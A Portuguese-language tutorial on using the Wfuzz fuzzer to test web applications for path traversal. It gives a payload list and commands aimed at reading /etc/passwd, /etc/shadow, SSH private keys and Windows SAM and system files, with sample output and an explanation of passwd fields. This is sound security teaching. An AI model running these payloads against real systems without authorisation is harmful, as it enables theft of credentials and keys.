# Wfuzz para Testes de Path Traversal

## Introdução

Wfuzz é uma ferramenta flexível e poderosa para fuzzing de aplicações web. Pode ser usada para testar vulnerabilidades como SQL injection, XSS, e, neste caso, path traversal. 

Path traversal é uma vulnerabilidade que permite a um atacante acessar arquivos e diretórios fora do diretório raiz da aplicação web. Este guia fornecerá uma visão geral sobre como usar Wfuzz para testar por path traversal.

## Instalação

### Instalação no Kali Linux

No Kali Linux, o Wfuzz pode ser instalado usando:

```bash
sudo apt-get update
sudo apt-get install wfuzz
```

## Conceitos Básicos

### Path Traversal

Path traversal (ou Directory Traversal) é uma vulnerabilidade que permite que um atacante acesse diretórios e arquivos fora do diretório raiz da aplicação. Por exemplo, usando padrões como `../../../etc/passwd`.

## Testando por Path Traversal com Wfuzz

### Preparar uma Lista de Payloads

Crie ou baixe uma lista de payloads para path traversal. Você pode criar um arquivo `payloads.txt` com entradas como:
```
../../../../../../etc/passwd
../../../../../../etc/shadow
../../../../../../var/www/html/index.php
```

Você também pode utilizar wordlists prontas como as:

- https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal.txt
- https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt
- https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt

### Realizar o Fuzzing

Use o Wfuzz para testar as entradas. Substitua `http://example.com/vulnerable/path` pelo URL do alvo e `FUZZ` pelo ponto onde os payloads serão inseridos.

#### Comando Básico

```bash
wfuzz -c -z file,payloads.txt --hc 404 http://example.com/vulnerable/path?file=FUZZ
```

- `-c`: Saída colorida para facilitar a leitura.
- `-z file,payloads.txt`: Usa a lista de payloads do arquivo `payloads.txt`.
- `--hc 404`: Oculta respostas HTTP 404 (Not Found), focando nos resultados interessantes.

### Interpretar os Resultados

Wfuzz retornará uma lista de respostas, incluindo o código de status HTTP, o tamanho da resposta e o tempo de resposta. Preste atenção em respostas que não são 404 ou que têm um tamanho diferente, indicando possíveis acessos a arquivos.

#### Exemplo de Saída
```
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://example.com/vulnerable/path?file=FUZZ
Total requests: 10

==================================================================
ID      Response   Lines      Word         Chars          Payload    
==================================================================
00001:  200        34 L       135 W        1024 Ch        ../../../../../../etc/passwd
00002:  404        5 L        10 W         100 Ch         ../../../../../../etc/shadow
00003:  200        12 L       40 W         400 Ch         ../../../../../../var/www/html/index.php
```

No exemplo acima, os payloads que retornaram 200 (OK) indicam que os arquivos foram acessados com sucesso.

### Usando Múltiplas Wordlists

Você pode combinar múltiplas listas de payloads para aumentar a cobertura do teste:

```bash
wfuzz -c -z file,payloads1.txt -z file,payloads2.txt --hc 404 http://example.com/vulnerable/path?file=FUZZ
```


### Caminhos Comuns em Sistemas Unix/Linux:

1. **../../etc/passwd**:
   - Tenta acessar o arquivo de senhas do sistema Unix/Linux, que contém informações sobre os usuários.

2. **../../etc/shadow**:
   - Tenta acessar o arquivo shadow, que armazena senhas criptografadas no Unix/Linux.

3. **../../var/log/messages**:
   - Tenta acessar o arquivo de logs do sistema.

4. **../../home/user/.ssh/id_rsa**:
   - Tenta acessar a chave privada SSH de um usuário específico.

5. **../../var/www/html/index.php**:
   - Tenta acessar arquivos de configuração ou scripts da aplicação web.

#### Arquivo `/etc/passwd`

O arquivo `/etc/passwd` é essencial para a operação do sistema. Ele define quais usuários existem no sistema, onde ficam seus diretórios home e qual shell de login eles usam. As senhas não são armazenadas diretamente nesse arquivo por questões de segurança; em vez disso, são armazenadas no arquivo `/etc/shadow`, que tem permissões restritas.

Cada linha do arquivo corresponde a um usuário diferente e contém sete campos separados por dois-pontos (`:`). Vamos analisar os campos desse arquivo:

1. **Nome de usuário**: O nome do usuário do sistema.
2. **Senha criptografada**: Normalmente, um `x` ou um `*` é colocado aqui, indicando que a senha real está armazenada em outro lugar (geralmente no arquivo `/etc/shadow`).
3. **ID do usuário (UID)**: Um número único que identifica o usuário no sistema.
4. **ID do grupo (GID)**: Um número único que identifica o grupo principal do usuário.
5. **Descrição do usuário**: Um campo de texto livre que pode conter uma descrição do usuário, como o nome completo.
6. **Diretório home**: O diretório de início do usuário, onde ficam seus arquivos pessoais e configurações.
7. **Shell de login**: O shell padrão atribuído ao usuário, que é executado após o login.

##### Análise do arquivo:

```plaintext
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
...
```

Vamos decompor a primeira linha como exemplo:

```plaintext
root:x:0:0:root:/root:/bin/bash
```

- **root**: Nome do usuário.
- **x**: A senha do root está armazenada no arquivo `/etc/shadow`.
- **0**: UID do root.
- **0**: GID do root.
- **root**: Descrição do usuário (normalmente, o nome completo).
- **/root**: Diretório home do root.
- **/bin/bash**: Shell de login padrão do root (Bash).

##### Significado dos Usuários Comuns:

- **daemon, bin, sys, sync, etc.**: Esses são usuários de sistema, usados para rodar processos específicos com permissões limitadas.
- **www-data**: Usuário típico usado pelo servidor web Apache.
- **nobody**: Um usuário genérico sem privilégios, usado para tarefas que não precisam de acesso a recursos protegidos.
- **peter, carlos, user, elmer, academy**: Usuários normais do sistema com seus próprios diretórios home e shells de login.


##### Considerações de Segurança:

- **Permissões**: O arquivo `/etc/passwd` é legível por todos os usuários, mas somente o root pode editá-lo.
- **Separação de Senhas**: A senha não é armazenada diretamente no arquivo, aumentando a segurança contra ataques.

### Caminhos Comuns em Sistemas Windows:

1. **..\\..\\..\\..\Windows\System32\drivers\etc\hosts**:
   - Tenta acessar o arquivo hosts, que pode ser usado para manipular a resolução de nomes de domínio.

2. **..\\..\\..\\..\Windows\System32\config\SAM**:
   - Tenta acessar o Security Account Manager (SAM), que contém informações sobre contas de usuários.

3. **..\\..\\..\\..\Windows\System32\cmd.exe**:
   - Tenta acessar o executável do prompt de comando, possivelmente para executar comandos arbitrários.

4. **..\\..\\..\\..\Windows\System32\config\system**:
   - Tenta acessar o arquivo de configuração do sistema.

## Conclusão

Wfuzz é uma ferramenta poderosa para testar por vulnerabilidades de path traversal em aplicações web. Este guia forneceu uma introdução ao uso do Wfuzz, desde a instalação até a execução de testes e interpretação de resultados. Lembre-se sempre de usar estas técnicas de forma ética e com permissão. Boa sorte e bons testes!